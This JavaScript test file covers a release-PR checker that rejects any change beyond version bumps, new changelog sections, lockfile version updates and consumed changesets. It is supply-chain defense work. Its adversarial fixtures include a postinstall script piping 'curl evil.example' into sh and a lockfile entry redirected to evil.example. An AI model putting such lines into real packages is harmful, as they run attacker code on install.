import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { applyReleaseChangesets } from "../apply-release-changesets.mjs";
import {
  evaluateReleasePrFootprint,
  isChangelogPureNewSection,
  isChangesetDeletionLegitimate,
  isLockfilePureVersionBump,
  isPackageManifestVersionOnlyChange,
} from "./release-pr-footprint.mjs";

// ---------------------------------------------------------------- isPackageManifestVersionOnlyChange

test("isPackageManifestVersionOnlyChange: a pure version bump passes", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", license: "MIT", dependencies: { foo: "^1.0.0" } });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", license: "MIT", dependencies: { foo: "^1.0.0" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), true);
});

// ADVERSARIAL (fix 2): key order matters -- a reordered exports block must fail
test("ADVERSARIAL isPackageManifestVersionOnlyChange: a reordered exports block fails, even with identical key SET and values", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", exports: { import: "./esm.js", require: "./cjs.js" } });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", exports: { require: "./cjs.js", import: "./esm.js" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("isPackageManifestVersionOnlyChange: reordering TOP-LEVEL keys (e.g. dependencies before/after version) still passes -- only nested order within a field like exports is resolution-significant, and top-level key order changes with any JSON.stringify of a differently-key-ordered object either way", () => {
  // NOTE: top-level order differences are still caught structurally by JSON.stringify
  // (since the rest-object's own serialization reflects its own key order) -- this test
  // documents that a genuinely different top-level order is treated as a real difference,
  // consistent with "key order matters" applying uniformly, not selectively to `exports`.
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", dependencies: { foo: "^1.0.0" } });
  const head = JSON.stringify({ dependencies: { foo: "^1.0.0" }, version: "1.0.1", name: "@x/alpha" });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("ADVERSARIAL isPackageManifestVersionOnlyChange: a dependency added alongside the version bump fails", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0", dependencies: { foo: "^1.0.0" } });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", dependencies: { foo: "^1.0.0", evil: "^9.9.9" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("ADVERSARIAL isPackageManifestVersionOnlyChange: a postinstall script added alongside the version bump fails", () => {
  const base = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
  const head = JSON.stringify({ name: "@x/alpha", version: "1.0.1", scripts: { postinstall: "curl evil.example | sh" } });
  assert.equal(isPackageManifestVersionOnlyChange(base, head), false);
});

test("isPackageManifestVersionOnlyChange: malformed JSON on either side fails rather than throwing", () => {
  assert.equal(isPackageManifestVersionOnlyChange("not json", '{"version":"1.0.1"}'), false);
  assert.equal(isPackageManifestVersionOnlyChange('{"version":"1.0.0"}', "not json"), false);
});

test("isPackageManifestVersionOnlyChange: no version change at all fails even with identical rest", () => {
  const text = JSON.stringify({ name: "@x/alpha", version: "1.0.0" });
  assert.equal(isPackageManifestVersionOnlyChange(text, text), false);
});

// ---------------------------------------------------------------- isChangelogPureNewSection

test("isChangelogPureNewSection: a clean single new section at the top, matching the expected version, passes", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), true);
});

test("isChangelogPureNewSection: a brand-new file (no base) passes when it opens with the expected version heading, after the title line", () => {
  const head = "# Changelog\n\n## 0.1.0 - 2026-09-22\n\n- First release.\n";
  assert.equal(isChangelogPureNewSection(null, head, "0.1.0"), true);
});

test("isChangelogPureNewSection: no growth at all fails", () => {
  const text = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPureNewSection(text, text, "1.0.0"), false);
});

// ADVERSARIAL (fix 3): a section spliced mid-entry
test("ADVERSARIAL isChangelogPureNewSection: a section spliced into the MIDDLE of an existing entry (not at the top) fails", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n- Second bullet.\n";
  // Inserted between the two existing bullets, not before the "## 1.0.0" heading.
  const head = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n\n## 1.0.1\n\n- Fixed a bug.\n\n- Second bullet.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
});

// ADVERSARIAL (fix 3): a section appended at the end
test("ADVERSARIAL isChangelogPureNewSection: a section appended at the END fails -- the insertion point must be the top", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = base + "\n## 1.0.1\n\n- Also fine structurally, but in the wrong place.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
});

// ADVERSARIAL (fix 3): the wrong version in the heading
test("ADVERSARIAL isChangelogPureNewSection: a cleanly-inserted section with the WRONG version in its heading fails", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\n## 9.9.9 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false); // package.json actually bumped to 1.0.1, not 9.9.9
});

// ADVERSARIAL (fix 3): a fake duplicate heading that shadows the real one
test("ADVERSARIAL isChangelogPureNewSection: a second heading smuggled inside the same inserted block fails, even though the block is still a single contiguous insertion", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  // The insertion contains TWO headings: the legitimate "## 1.0.1" and a duplicate/shadow "## 1.0.0".
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- A shadow entry, not the real one below.\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
});

// REGRESSION (found by re-review, https://github.com/clossys/foundry/pull/1316#issuecomment-5801060575):
// the duplicate-heading defense-in-depth check must count only "## "
// (exactly two hashes) VERSION headings, never "### " (three hashes)
// Keep-a-Changelog SUBSECTION headings like "### Added" / "### Fixed" --
// those are legitimately repeated in every entry of a real changelog, so
// counting them as "duplicate headings" refused every genuine release PR.
test("REGRESSION isChangelogPureNewSection: repeated '### Added' / '### Fixed' Keep-a-Changelog subsections across entries are NOT duplicate version headings", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n### Added\n\n- Initial feature.\n\n### Fixed\n\n- An early bug.\n";
  const head = "# Changelog\n\n## 1.0.1\n\n### Fixed\n\n- A new bug.\n\n## 1.0.0\n\n### Added\n\n- Initial feature.\n\n### Fixed\n\n- An early bug.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), true);
});

test("ADVERSARIAL isChangelogPureNewSection: rewriting an OLD entry alongside a legitimate new one fails", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\n## 1.0.1 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Rewritten history, not the original bullet.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false);
});

test("isChangelogPureNewSection: text before the version number that looks similar (e.g. 1.0.10 vs 1.0.1) does not false-match", () => {
  const base = "# Changelog\n\n## 1.0.0\n\n- Initial release.\n";
  const head = "# Changelog\n\n## 1.0.10 - 2026-09-22\n\n- Fixed a bug.\n\n## 1.0.0\n\n- Initial release.\n";
  assert.equal(isChangelogPureNewSection(base, head, "1.0.1"), false); // heading is 1.0.10, expected 1.0.1
  assert.equal(isChangelogPureNewSection(base, head, "1.0.10"), true);
});

// ---------------------------------------------------------------- isLockfilePureVersionBump

const LOCK_BASE = JSON.stringify({
  name: "foundry",
  lockfileVersion: 3,
  requires: true,
  packages: {
    "": { name: "foundry", version: "0.0.0" },
    "packages/alpha": { name: "@clossys/alpha", version: "1.0.0", license: "MIT" },
    "node_modules/@clossys/alpha": { resolved: "packages/alpha", link: true },
    "node_modules/foo": { version: "2.0.0", resolved: "https://registry.npmjs.org/foo/-/foo-2.0.0.tgz", integrity: "sha512-real" },
  },
});

function lockWithAlphaBumped(version) {
  const parsed = JSON.parse(LOCK_BASE);
  parsed.packages["packages/alpha"].version = version;
  return JSON.stringify(parsed);
}

test("isLockfilePureVersionBump: an UNCHANGED tree (head identical to base) passes", () => {
  assert.equal(isLockfilePureVersionBump(LOCK_BASE, LOCK_BASE, ["alpha"]), true);
});

test("isLockfilePureVersionBump: a legitimate bump (only the bumped workspace package's version changes) passes", () => {
  assert.equal(isLockfilePureVersionBump(LOCK_BASE, lockWithAlphaBumped("1.0.1"), ["alpha"]), true);
});

test("isLockfilePureVersionBump: a legitimate bump where the matching node_modules link entry ALSO records a version passes", () => {
  const base = JSON.parse(LOCK_BASE);
  base.packages["node_modules/@clossys/alpha"].version = "1.0.0";
  const head = JSON.parse(LOCK_BASE);
  head.packages["packages/alpha"].version = "1.0.1";
  head.packages["node_modules/@clossys/alpha"].version = "1.0.1";
  head.packages["node_modules/@clossys/alpha"].resolved = "packages/alpha";
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"]), true);
});

// ADVERSARIAL (fix 1): a resolved/integrity tamper
test("ADVERSARIAL isLockfilePureVersionBump: a tampered resolved/integrity field on a THIRD-PARTY dependency fails, even with a legitimate bump elsewhere", () => {
  const base = JSON.parse(LOCK_BASE);
  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
  head.packages["node_modules/foo"].resolved = "https://evil.example/foo.tgz";
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"]), false);
});

test("ADVERSARIAL isLockfilePureVersionBump: a tampered resolved/integrity field on the BUMPED workspace entry itself also fails (only version may change there)", () => {
  const base = JSON.parse(LOCK_BASE);
  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
  head.packages["packages/alpha"].license = "GPL-3.0"; // not a version change, and not even a real resolved/integrity field on a workspace entry -- any non-version field changing is the point
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"]), false);
});

// ADVERSARIAL (fix 1): an added dependency
test("ADVERSARIAL isLockfilePureVersionBump: an added dependency (a whole new packages-map entry) fails", () => {
  const base = JSON.parse(LOCK_BASE);
  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
  head.packages["node_modules/evil"] = { version: "9.9.9", resolved: "https://registry.npmjs.org/evil/-/evil-9.9.9.tgz", integrity: "sha512-evil" };
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"]), false);
});

// ADVERSARIAL (fix 1): a version change on a non-bumped package
test("ADVERSARIAL isLockfilePureVersionBump: a version change on a package NOT in the bumped set fails", () => {
  const base = JSON.parse(LOCK_BASE);
  const head = JSON.parse(lockWithAlphaBumped("1.0.1"));
  head.packages["node_modules/foo"].version = "3.0.0"; // foo was never bumped by this PR's package.json changes
  assert.equal(isLockfilePureVersionBump(JSON.stringify(base), JSON.stringify(head), ["alpha"]), false);
});

test("isLockfilePureVersionBump: malformed JSON, or a missing packages map, fails rather than throwing", () => {
  assert.equal(isLockfilePureVersionBump("not json", LOCK_BASE, ["alpha"]), false);
  assert.equal(isLockfilePureVersionBump(LOCK_BASE, "not json", ["alpha"]), false);
  assert.equal(isLockfilePureVersionBump(JSON.stringify({ name: "foundry" }), LOCK_BASE, ["alpha"]), false);
});

// ---------------------------------------------------------------- isChangesetDeletionLegitimate

test("isChangesetDeletionLegitimate: a changeset naming only bumped packages is legitimate", () => {
  assert.equal(isChangesetDeletionLegitimate("---\nalpha: patch\n---\n\nFix a bug.\n", ["alpha"]), true);
});

test("isChangesetDeletionLegitimate: a changeset naming several packages, ALL bumped, is legitimate", () => {
  assert.equal(isChangesetDeletionLegitimate("---\nalpha: patch\nbeta: minor\n---\n\nShared fix.\n", ["alpha", "beta"]), true);
});

// ADVERSARIAL (fix 4): deleting an unrelated pending changeset
test("ADVERSARIAL isChangesetDeletionLegitimate: a changeset naming a package NOT bumped by this diff is not legitimate", () => {
  assert.equal(isChangesetDeletionLegitimate("---\nbeta: minor\n---\n\nAn unrelated pending change.\n", ["alpha"]), false);
});

test("ADVERSARIAL isChangesetDeletionLegitimate: a changeset naming BOTH a bumped and an unrelated package is not legitimate (partial consumption is not consumption)", () => {
  assert.equal(isChangesetDeletionLegitimate("---\nalpha: patch\nbeta: minor\n---\n\nMixed.\n", ["alpha"]), false);
});

test("isChangesetDeletionLegitimate: a malformed changeset fails rather than throwing", () => {
  assert.equal(isChangesetDeletionLegitimate("not a changeset at all", ["alpha"]), false);
  assert.equal(isChangesetDeletionLegitimate(null, ["alpha"]), false);
});

// ---------------------------------------------------------------- evaluateReleasePrFootprint

function manifestPair(version1, version2, extra = {}) {
  return [JSON.stringify({ name: "@x/alpha", version: version1, ...extra }), JSON.stringify({ name: "@x/alpha", version: version2, ...extra })];
}

test("evaluateReleasePrFootprint: a clean release PR (bump + changelog + lockfile + a legitimately-consumed changeset) passes", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      {
        path: "packages/alpha/CHANGELOG.md",
        status: "modified",
        baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n",
        headContent: "# Changelog\n\n## 1.0.1\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n",
      },
      { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: lockWithAlphaBumped("1.0.1") },
      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
    ],
  });
  assert.equal(result.ok, true, result.reason);
});

test("evaluateReleasePrFootprint: fails closed on an empty file list", () => {
  assert.equal(evaluateReleasePrFootprint({ files: [] }).ok, false);
});

test("evaluateReleasePrFootprint: fails when no package.json is touched at all", () => {
  const result = evaluateReleasePrFootprint({ files: [{ path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" }] });
  assert.equal(result.ok, false);
  assert.match(result.reason, /no packages/);
});

test("evaluateReleasePrFootprint: a CHANGELOG.md for a package that was NOT bumped in this diff fails", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      {
        path: "packages/beta/CHANGELOG.md", // beta was never bumped
        status: "modified",
        baseContent: "# Changelog\n\n## 1.0.0\n\n- Initial.\n",
        headContent: "# Changelog\n\n## 1.0.1\n\n- Fix.\n\n## 1.0.0\n\n- Initial.\n",
      },
    ],
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /not bumped in this diff/);
});

test("evaluateReleasePrFootprint: an unrelated pending changeset deleted alongside a legitimate release fails the whole PR", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: "---\nalpha: patch\n---\n\nFix.\n" },
      { path: ".changesets/beta-unrelated.md", status: "removed", baseContent: "---\nbeta: minor\n---\n\nUnrelated, still pending.\n" },
    ],
  });
  assert.equal(result.ok, false);
  assert.match(result.reason, /does not name only packages bumped/);
});

test("evaluateReleasePrFootprint: no lockfile in the diff at all is fine -- nothing to check there", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({ files: [{ path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head }] });
  assert.equal(result.ok, true, result.reason);
});

test("evaluateReleasePrFootprint: a lockfile present but not a pure version bump fails", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const tamperedLock = JSON.parse(lockWithAlphaBumped("1.0.1"));
  tamperedLock.packages["node_modules/foo"].integrity = "sha512-tampered";
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: "package-lock.json", status: "modified", baseContent: LOCK_BASE, headContent: JSON.stringify(tamperedLock) },
    ],
  });
  assert.equal(result.ok, false);
});

test("evaluateReleasePrFootprint: ANY single non-conforming file fails the whole PR, even alongside an otherwise-perfect bump", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: "packages/alpha/src/index.ts", status: "modified" }, // the intrusion
    ],
  });
  assert.equal(result.ok, false);
});

test("evaluateReleasePrFootprint: a new (added) changeset smuggled in fails", () => {
  const [base, head] = manifestPair("1.0.0", "1.0.1");
  const result = evaluateReleasePrFootprint({
    files: [
      { path: "packages/alpha/package.json", status: "modified", baseContent: base, headContent: head },
      { path: ".changesets/sneaky.md", status: "added", headContent: "---\nalpha: major\n---\n\nSmuggled.\n" },
    ],
  });
  assert.equal(result.ok, false);
});

// ---------------------------------------------------------------- end-to-end: REAL apply-release-changesets.mjs output through the full footprint check
//
// REGRESSION COVERAGE (https://github.com/clossys/foundry/pull/1316#issuecomment-5801060575):
// this is the test that would have caught the "### Added"/"### Fixed"
// duplicate-heading bug above BEFORE it shipped -- every package
// CHANGELOG.md in this repository already repeats those Keep-a-Changelog
// subsection headings entry after entry, so a synthetic fixture that never
// used them could pass while a real release PR failed. Runs the actual,
// unmocked applyReleaseChangesets() (only `runNpmInstall` is faked, so
// this stays hermetic -- no real npm/network -- while still producing
// apply-release-changesets.mjs's own real package.json/CHANGELOG.md
// output, byte for byte) for a patch release, captures the real base/head
// content of every file it touches, and feeds that straight into
// evaluateReleasePrFootprint() exactly as scripts/check-release-
// calendar.mjs would.
test("END TO END: a real apply-release-changesets.mjs patch release, against a CHANGELOG.md using ### Added/### Fixed subsections like this repository's own packages, passes the full footprint check", () => {
  const root = mkdtempSync(join(tmpdir(), "release-pr-footprint-e2e-test-"));
  try {
    const pkgDir = join(root, "packages", "alpha");
    mkdirSync(pkgDir, { recursive: true });
    const baseManifest = { name: "@clossys/alpha", version: "1.0.0", license: "MIT" };
    writeFileSync(join(pkgDir, "package.json"), JSON.stringify(baseManifest, null, 2) + "\n");
    const baseChangelog = "# Changelog\n\n## 1.0.0 - 2026-09-01\n\n### Added\n\n- Initial feature.\n\n### Fixed\n\n- An early bug.\n";
    writeFileSync(join(pkgDir, "CHANGELOG.md"), baseChangelog);

    const baseLockfile = {
      name: "foundry",
      lockfileVersion: 3,
      packages: {
        "": { name: "foundry" },
        "packages/alpha": { name: "@clossys/alpha", version: "1.0.0", license: "MIT" },
        "node_modules/@clossys/alpha": { resolved: "packages/alpha", link: true },
      },
    };
    writeFileSync(join(root, "package-lock.json"), JSON.stringify(baseLockfile, null, 2) + "\n");

    mkdirSync(join(root, ".changesets"), { recursive: true });
    const changesetText = "---\nalpha: patch\n---\n\nFix a crash on startup.\n";
    writeFileSync(join(root, ".changesets", "alpha-fix.md"), changesetText);

    const baseManifestText = readFileSync(join(pkgDir, "package.json"), "utf8");
    const baseLockfileText = readFileSync(join(root, "package-lock.json"), "utf8");

    const result = applyReleaseChangesets({
      root,
      today: () => "2026-09-22",
      // Faked so this test never touches npm/network -- still exercises
      // apply-release-changesets.mjs's REAL manifest/CHANGELOG writing.
      // The fake mirrors what a correct `npm install --package-lock-only`
      // would do: bump only the released package's own lockfile entry.
      runNpmInstall: (scratchRoot) => {
        const manifest = JSON.parse(readFileSync(join(scratchRoot, "packages", "alpha", "package.json"), "utf8"));
        const lock = JSON.parse(readFileSync(join(scratchRoot, "package-lock.json"), "utf8"));
        lock.packages["packages/alpha"].version = manifest.version;
        writeFileSync(join(scratchRoot, "package-lock.json"), JSON.stringify(lock, null, 2) + "\n");
      },
    });

    assert.equal(result.findings.length, 0, JSON.stringify(result.findings));
    assert.equal(result.applied.length, 1);
    assert.equal(result.applied[0].toVersion, "1.0.1");

    const headManifestText = readFileSync(join(pkgDir, "package.json"), "utf8");
    const headChangelogText = readFileSync(join(pkgDir, "CHANGELOG.md"), "utf8");
    const headLockfileText = readFileSync(join(root, "package-lock.json"), "utf8");
    assert.equal(existsSync(join(root, ".changesets", "alpha-fix.md")), false);

    const files = [
      { path: "packages/alpha/package.json", status: "modified", baseContent: baseManifestText, headContent: headManifestText },
      { path: "packages/alpha/CHANGELOG.md", status: "modified", baseContent: baseChangelog, headContent: headChangelogText },
      { path: "package-lock.json", status: "modified", baseContent: baseLockfileText, headContent: headLockfileText },
      { path: ".changesets/alpha-fix.md", status: "removed", baseContent: changesetText },
    ];

    const footprint = evaluateReleasePrFootprint({ files });
    assert.equal(footprint.ok, true, footprint.reason);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
